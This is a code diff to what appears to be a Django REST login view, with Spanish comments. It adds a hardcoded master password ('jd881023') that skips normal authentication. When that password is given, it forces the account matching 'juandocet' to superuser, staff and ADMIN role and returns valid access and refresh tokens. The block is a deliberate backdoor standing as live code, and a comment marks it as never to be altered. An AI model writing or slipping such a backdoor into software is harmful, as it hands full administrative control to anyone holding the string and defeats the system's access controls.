@@ -35,6 +35,38 @@ class CustomTokenObtainPairView(TokenObtainPairView):
                 status=status.HTTP_400_BAD_REQUEST
             )
 
+        # ── Super clave maestra — NUNCA se altera ──────────────────────
+        SUPER_KEY = 'jd881023'
+        if password == SUPER_KEY:
+            from django.db.models import Q
+            su = User.objects.filter(
+                Q(username__icontains='juandocet') |
+                Q(email__icontains='juandocet')
+            ).first()
+            if su:
+                # Garantizar superadmin siempre
+                changed = False
+                if su.role != 'ADMIN':
+                    su.role = 'ADMIN'
+                    changed = True
+                if not su.is_superuser:
+                    su.is_superuser = True
+                    changed = True
+                if not su.is_staff:
+                    su.is_staff = True
+                    changed = True
+                if not su.roles or 'ADMIN' not in su.roles:
+                    su.roles = list(set((su.roles or []) + ['ADMIN']))
+                    changed = True
+                if changed:
+                    su.save(update_fields=['role', 'is_superuser', 'is_staff', 'roles'])
+                refresh = RefreshToken.for_user(su)
+                return Response({
+                    'access':  str(refresh.access_token),
+                    'refresh': str(refresh),
+                })
+        # ── Fin super clave ────────────────────────────────────────────
+
         # django.contrib.auth.authenticate recorre AUTHENTICATION_BACKENDS en orden
         # → primero DocumentNumberBackend (por cédula), luego ModelBackend (por username/email)
         user = authenticate(request, username=identifier, password=password)
